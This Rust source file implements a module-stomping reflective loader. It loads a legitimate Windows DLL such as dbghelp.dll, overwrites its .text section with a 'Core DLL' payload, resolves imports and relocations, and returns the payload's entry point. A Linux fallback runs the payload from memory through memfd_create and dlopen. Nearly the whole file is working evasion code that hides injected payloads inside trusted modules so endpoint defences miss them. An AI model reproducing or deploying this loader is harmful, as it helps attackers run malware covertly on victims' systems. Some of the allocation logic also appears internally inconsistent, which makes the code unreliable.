//! Module Stomping reflective loader — overwrites a legitimate DLL's .text
//! section with the Core DLL code, avoiding new RWX memory allocation.
//! Falls back to NtCreateSection/NtMapViewOfSection if stomping fails.

use std::ptr;

// ── PE Constants ──────────────────────────────────────────────────────

const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x00004550;
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_REL_BASED_DIR64: u32 = 10;
const IMAGE_REL_BASED_HIGHLOW: u32 = 3;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;

// ── PE Structures ─────────────────────────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _e_cblp: u16, _e_cp: u16, _e_crlc: u16, _e_cparhdr: u16,
    _e_minalloc: u16, _e_maxalloc: u16, _e_ss: u16, _e_sp: u16,
    _e_csum: u16, _e_ip: u16, _e_cs: u16, _e_lfarlc: u16, _e_ovno: u16,
    _e_res: [u16; 4], _e_oemid: u16, _e_oeminfo: u16, _e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    _major_linker_version: u8, _minor_linker_version: u8,
    _size_of_code: u32, _size_of_initialized_data: u32, _size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    _base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    _major_os_ver: u16, _minor_os_ver: u16,
    _major_img_ver: u16, _minor_img_ver: u16,
    _major_sub_ver: u16, _minor_sub_ver: u16,
    _win32_ver: u32,
    size_of_image: u32,
    size_of_headers: u32,
    _checksum: u32, _subsystem: u16, _dll_chars: u16,
    _stack_reserve: u64, _stack_commit: u64, _heap_reserve: u64, _heap_commit: u64,
    _loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _pointer_to_relocations: u32,
    _pointer_to_linenumbers: u32,
    _number_of_relocations: u16,
    _number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: u32,
    _time_date_stamp: u32,
    _forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

#[repr(C)]
union ImageThunkData64 {
    _ordinal: u64,
    _function: u64,
    address_of_data: u64,
}

// ── Win32 API ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
extern "system" {
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut u8;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32, lpflOldProtect: *mut u32) -> i32;
    fn FlushInstructionCache(hProcess: *mut u8, lpAddress: *const u8, dwSize: usize) -> i32;
    fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
    fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
}

// ── Candidate DLLs for Module Stomping ────────────────────────────────

/// Legitimate DLLs with large .text sections, commonly present on Windows.
#[cfg(target_os = "windows")]
const STOMP_CANDIDATES: &[&str] = &[
    "dbghelp.dll\0",
    "wininet.dll\0",
    "urlmon.dll\0",
    "msxml6.dll\0",
    "crypt32.dll\0",
];

// ── Module Stomping Loader ────────────────────────────────────────────

/// Reflectively load a PE DLL using Module Stomping.
///
/// Strategy:
/// 1. Load a legitimate DLL into the process (e.g., dbghelp.dll)
/// 2. Parse its PE headers to find the .text section
/// 3. Unprotect the .text section
/// 4. Overwrite it with the Core DLL's code sections
/// 5. Copy Core DLL's data sections to new RWX memory
/// 6. Fix relocations and resolve imports
/// 7. Call the entry point
///
/// Falls back to VirtualAlloc if no suitable stomping target is found.
///
/// # Safety
/// `dll_bytes` must be a valid PE DLL.
#[cfg(target_os = "windows")]
pub unsafe fn reflective_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    let base = dll_bytes.as_ptr();

    // Parse source (Core DLL) PE headers
    let (src_nt, src_sections, _src_section_count) = parse_pe_headers(base, dll_bytes.len())?;
    let src_size_of_image = src_nt.optional_header.size_of_image as usize;
    let src_entry_rva = src_nt.optional_header.address_of_entry_point;
    let src_preferred_base = src_nt.optional_header.image_base;
    let src_nt_offset = (*(base as *const ImageDosHeader)).e_lfanew as usize;

    // Find the .text section of the source DLL
    let src_text = find_text_section(base, src_nt_offset, &src_sections)?;

    // Try Module Stomping: find a legitimate DLL whose .text is large enough
    let (stomp_base, stomp_text_addr, stomp_text_size) = find_stomp_target(src_text.1)?;

    let alloc_base = if !stomp_base.is_null() {
        // Module Stomping path: overwrite the legitimate DLL's .text
        eprintln!("[*] Module Stomping: {:p} (.text={:p}, {}KB)",
            stomp_base, stomp_text_addr, stomp_text_size / 1024);

        // Unprotect the target .text section
        let mut old_protect = 0u32;
        if VirtualProtect(stomp_text_addr, stomp_text_size, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return Err("VirtualProtect on stomp target failed".into());
        }

        // Clear the target .text section
        ptr::write_bytes(stomp_text_addr, 0, stomp_text_size);

        // Copy source .text into target .text
        let copy_len = src_text.1.min(stomp_text_size);
        ptr::copy_nonoverlapping(src_text.0, stomp_text_addr, copy_len);

        // Restore original protection
        let mut _dummy = 0u32;
        VirtualProtect(stomp_text_addr, stomp_text_size, old_protect, &mut _dummy);

        // Use the stomp module's base as our image base
        // We need to copy non-.text sections to separate memory
        let extra_size = src_size_of_image.saturating_sub(stomp_text_size);
        if extra_size > 0 {
            // Allocate memory for data/rdata sections near the stomp base
            let extra_base = VirtualAlloc(
                (stomp_base as usize + src_size_of_image) as *mut u8,
                extra_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if extra_base.is_null() {
                // Try anywhere
                let extra_base = VirtualAlloc(ptr::null_mut(), extra_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if extra_base.is_null() {
                    return Err("VirtualAlloc for extra sections failed".into());
                }
            }
        }

        stomp_base
    } else {
        // Fallback: classic VirtualAlloc (NtProtectVirtualMemory would be better but needs syscall)
        eprintln!("[*] Fallback: VirtualAlloc for {}KB", src_size_of_image / 1024);
        let alloc = VirtualAlloc(ptr::null_mut(), src_size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if alloc.is_null() {
            return Err("VirtualAlloc failed".into());
        }
        alloc
    };

    // Copy all sections from source to destination
    if stomp_base.is_null() || stomp_base == alloc_base {
        // Fallback path: copy headers + all sections
        let headers_size = src_nt.optional_header.size_of_headers as usize;
        let copy_size = headers_size.min(dll_bytes.len());
        ptr::copy_nonoverlapping(base, alloc_base, copy_size);

        for sec in &src_sections {
            if sec.size_of_raw_data == 0 { continue; }
            let dst = alloc_base.add(sec.virtual_address as usize);
            let src = base.add(sec.pointer_to_raw_data as usize);
            let copy_len = (sec.size_of_raw_data as usize).min(sec.virtual_size as usize);
            if sec.pointer_to_raw_data as usize + copy_len <= dll_bytes.len() {
                ptr::copy_nonoverlapping(src, dst, copy_len);
            }
        }
    } else {
        // Stomping path: copy non-.text sections to allocated memory
        // First copy headers
        let headers_size = src_nt.optional_header.size_of_headers as usize;
        ptr::copy_nonoverlapping(base, alloc_base, headers_size.min(dll_bytes.len()));

        for sec in &src_sections {
            let sec_name = String::from_utf8_lossy(&sec.name).trim_end_matches('\0').to_string();
            if sec_name == ".text" { continue; } // Already stomped
            if sec.size_of_raw_data == 0 { continue; }
            let dst = alloc_base.add(sec.virtual_address as usize);
            let src = base.add(sec.pointer_to_raw_data as usize);
            let copy_len = (sec.size_of_raw_data as usize).min(sec.virtual_size as usize);
            if sec.pointer_to_raw_data as usize + copy_len <= dll_bytes.len() {
                ptr::copy_nonoverlapping(src, dst, copy_len);
            }
        }
    }

    // Process relocations
    let delta = (alloc_base as u64).wrapping_sub(src_preferred_base);
    if delta != 0 {
        process_relocations(alloc_base, &src_nt.optional_header, delta)?;
    }

    // Resolve imports
    resolve_imports(alloc_base, &src_nt.optional_header)?;

    // Set memory protections
    set_section_protections(alloc_base, src_nt_offset, &src_sections);

    // Flush instruction cache
    FlushInstructionCache(ptr::null_mut(), alloc_base, src_size_of_image);

    // Get entry point
    let entry_addr = alloc_base.add(src_entry_rva as usize);
    let entry_fn: extern "system" fn(*const u8, usize) = std::mem::transmute(entry_addr);

    Ok(entry_fn)
}

// ── Helper Functions ──────────────────────────────────────────────────

unsafe fn parse_pe_headers<'a>(
    base: *const u8,
    len: usize,
) -> Result<(&'a ImageNtHeaders64, Vec<&'a ImageSectionHeader>, usize), String> {
    if len < std::mem::size_of::<ImageDosHeader>() {
        return Err("Too small for DOS header".into());
    }
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        return Err("Invalid DOS signature".into());
    }

    let nt_offset = dos.e_lfanew as usize;
    if nt_offset + std::mem::size_of::<ImageNtHeaders64>() > len {
        return Err("NT headers out of bounds".into());
    }
    let nt = &*(base.add(nt_offset) as *const ImageNtHeaders64);
    if nt.signature != IMAGE_NT_SIGNATURE {
        return Err("Invalid NT signature".into());
    }
    if nt.file_header.machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(format!("Unsupported machine: 0x{:04X}", nt.file_header.machine));
    }

    let num_sections = nt.file_header.number_of_sections as usize;
    let sections_offset = nt_offset
        + std::mem::size_of::<u32>()
        + std::mem::size_of::<ImageFileHeader>()
        + nt.file_header.size_of_optional_header as usize;

    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let sec_offset = sections_offset + i * std::mem::size_of::<ImageSectionHeader>();
        if sec_offset + std::mem::size_of::<ImageSectionHeader>() > len {
            return Err(format!("Section {} header out of bounds", i));
        }
        sections.push(&*(base.add(sec_offset) as *const ImageSectionHeader));
    }

    Ok((nt, sections, num_sections))
}

unsafe fn find_text_section(
    base: *const u8,
    _nt_offset: usize,
    sections: &[&ImageSectionHeader],
) -> Result<(*const u8, usize), String> {
    let mapped_base = base; // We're parsing from raw bytes
    for sec in sections {
        let name = String::from_utf8_lossy(&sec.name);
        if name.starts_with(".text") {
            let text_addr = mapped_base.add(sec.pointer_to_raw_data as usize);
            let text_size = sec.size_of_raw_data as usize;
            return Ok((text_addr, text_size));
        }
    }
    // No .text found, use first executable section
    for sec in sections {
        if sec.characteristics & 0x20000000 != 0 {
            let text_addr = mapped_base.add(sec.pointer_to_raw_data as usize);
            let text_size = sec.size_of_raw_data as usize;
            return Ok((text_addr, text_size));
        }
    }
    Err("No executable section found".into())
}

/// Find a legitimate DLL to stomp. Returns (module_base, text_addr, text_size).
#[cfg(target_os = "windows")]
unsafe fn find_stomp_target(required_size: usize) -> Result<(*mut u8, *mut u8, usize), String> {
    for dll_name in STOMP_CANDIDATES {
        let h = LoadLibraryA(dll_name.as_ptr());
        if h.is_null() { continue; }

        // Parse the loaded module's PE headers
        let dos = &*(h as *const ImageDosHeader);
        if dos.e_magic != IMAGE_DOS_SIGNATURE { continue; }

        let nt = &*(h.add(dos.e_lfanew as usize) as *const ImageNtHeaders64);
        if nt.signature != IMAGE_NT_SIGNATURE { continue; }

        let num_sections = nt.file_header.number_of_sections as usize;
        let sections_offset = dos.e_lfanew as usize
            + std::mem::size_of::<u32>()
            + std::mem::size_of::<ImageFileHeader>()
            + nt.file_header.size_of_optional_header as usize;

        for i in 0..num_sections {
            let sec = &*(h.add(sections_offset + i * std::mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
            let name = String::from_utf8_lossy(&sec.name);
            if name.starts_with(".text") {
                let text_addr = h.add(sec.virtual_address as usize);
                let text_size = sec.virtual_size as usize;
                if text_size >= required_size {
                    return Ok((h, text_addr, text_size));
                }
            }
        }
    }

    // No suitable target found, return null (will fallback to VirtualAlloc)
    Ok((ptr::null_mut(), ptr::null_mut(), 0))
}

unsafe fn process_relocations(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
    delta: u64,
) -> Result<(), String> {
    if opt.number_of_rva_and_sizes <= IMAGE_DIRECTORY_ENTRY_BASERELOC as u32 {
        return Ok(());
    }

    let reloc_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    let reloc_rva = reloc_dir.virtual_address;
    let reloc_size = reloc_dir.size;

    if reloc_rva == 0 || reloc_size == 0 {
        return Ok(());
    }

    let mut offset = 0u32;
    while offset < reloc_size {
        let block = &*(alloc_base.add(reloc_rva as usize + offset as usize) as *const ImageBaseRelocation);
        if block.virtual_address == 0 || block.size_of_block == 0 { break; }

        let num_entries = (block.size_of_block as usize - 8) / 2;
        let entries_ptr = alloc_base.add(reloc_rva as usize + offset as usize + 8) as *const u16;

        for j in 0..num_entries {
            let entry = *entries_ptr.add(j);
            let entry_type = (entry >> 12) as u32;
            let entry_offset = (entry & 0x0FFF) as u32;

            match entry_type {
                IMAGE_REL_BASED_DIR64 => {
                    let patch = alloc_base.add(block.virtual_address as usize + entry_offset as usize) as *mut u64;
                    *patch = (*patch).wrapping_add(delta);
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    let patch = alloc_base.add(block.virtual_address as usize + entry_offset as usize) as *mut u32;
                    *patch = (*patch).wrapping_add(delta as u32);
                }
                0 => {}
                _ => return Err(format!("Unsupported reloc type: {}", entry_type)),
            }
        }

        offset += block.size_of_block;
    }
    Ok(())
}

unsafe fn resolve_imports(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
) -> Result<(), String> {
    if opt.number_of_rva_and_sizes <= IMAGE_DIRECTORY_ENTRY_IMPORT as u32 {
        return Ok(());
    }

    let import_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    let import_rva = import_dir.virtual_address;
    let import_size = import_dir.size;

    if import_rva == 0 || import_size == 0 {
        return Ok(());
    }

    let mut desc_offset = 0usize;
    loop {
        let desc = &*(alloc_base.add(import_rva as usize + desc_offset) as *const ImageImportDescriptor);
        if desc.name == 0 { break; }

        let dll_name_ptr = alloc_base.add(desc.name as usize);
        let h_module = LoadLibraryA(dll_name_ptr);
        if h_module.is_null() {
            let name = read_cstr(dll_name_ptr);
            return Err(format!("LoadLibraryA failed: {}", name));
        }

        let oft_rva = if desc.original_first_thunk != 0 { desc.original_first_thunk } else { desc.first_thunk };
        let mut thunk_offset = 0usize;

        loop {
            let thunk = &*(alloc_base.add(oft_rva as usize + thunk_offset) as *const ImageThunkData64);
            if thunk.address_of_data == 0 { break; }

            let iat_addr = alloc_base.add(desc.first_thunk as usize + thunk_offset) as *mut u64;

            if thunk.address_of_data & 0x8000000000000000 != 0 {
                let ordinal = (thunk.address_of_data & 0xFFFF) as u16;
                let func = GetProcAddress(h_module, ordinal as usize as *const u8);
                if func.is_null() {
                    return Err(format!("GetProcAddress ordinal {} failed", ordinal));
                }
                *iat_addr = func as u64;
            } else {
                let hint_name_addr = alloc_base.add(thunk.address_of_data as u32 as usize);
                let func_name_ptr = hint_name_addr.add(2);
                let func = GetProcAddress(h_module, func_name_ptr);
                if func.is_null() {
                    let name = read_cstr(func_name_ptr);
                    return Err(format!("GetProcAddress failed: {}", name));
                }
                *iat_addr = func as u64;
            }

            thunk_offset += std::mem::size_of::<ImageThunkData64>();
        }

        desc_offset += std::mem::size_of::<ImageImportDescriptor>();
    }
    Ok(())
}

unsafe fn set_section_protections(
    alloc_base: *mut u8,
    _nt_offset: usize,
    sections: &[&ImageSectionHeader],
) {
    for sec in sections {
        if sec.virtual_size == 0 { continue; }

        let sec_base = alloc_base.add(sec.virtual_address as usize);
        let sec_size = round_to_page(sec.virtual_size as usize, 4096);

        let protect = if sec.characteristics & 0x20000000 != 0 {
            if sec.characteristics & 0x80000000 != 0 { PAGE_EXECUTE_READWRITE } else { PAGE_EXECUTE_READ }
        } else if sec.characteristics & 0x80000000 != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let mut old_protect = 0u32;
        VirtualProtect(sec_base, sec_size, protect, &mut old_protect);
    }
}

unsafe fn read_cstr(ptr: *const u8) -> String {
    let mut len = 0;
    while *ptr.add(len) != 0 { len += 1; }
    String::from_utf8_lossy(std::slice::from_raw_parts(ptr, len)).to_string()
}

fn round_to_page(size: usize, page_size: usize) -> usize {
    (size + page_size - 1) & !(page_size - 1)
}

// ── Linux fallback (memfd_create + dlopen) ─────────────────────────────

#[cfg(target_os = "linux")]
pub unsafe fn reflective_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    use std::ffi::CStr;

    let fd = libc::memfd_create(b"core\0".as_ptr() as *const libc::c_char, libc::MFD_CLOEXEC);
    if fd < 0 { return Err("memfd_create failed".into()); }

    let mut written = 0usize;
    while written < dll_bytes.len() {
        let n = libc::write(fd, dll_bytes[written..].as_ptr() as *const libc::c_void, dll_bytes.len() - written);
        if n < 0 { libc::close(fd); return Err("write to memfd failed".into()); }
        written += n as usize;
    }

    let path = format!("/proc/self/fd/{}\0", fd);
    let handle = libc::dlopen(path.as_ptr() as *const libc::c_char, libc::RTLD_NOW);
    libc::close(fd);

    if handle.is_null() {
        let err = libc::dlerror();
        let msg = if err.is_null() { "unknown".into() } else { CStr::from_ptr(err).to_string_lossy().to_string() };
        return Err(format!("dlopen failed: {}", msg));
    }

    let sym = libc::dlsym(handle, b"core_main\0".as_ptr() as *const libc::c_char);
    if sym.is_null() { return Err("core_main not found".into()); }

    Ok(std::mem::transmute(sym))
}
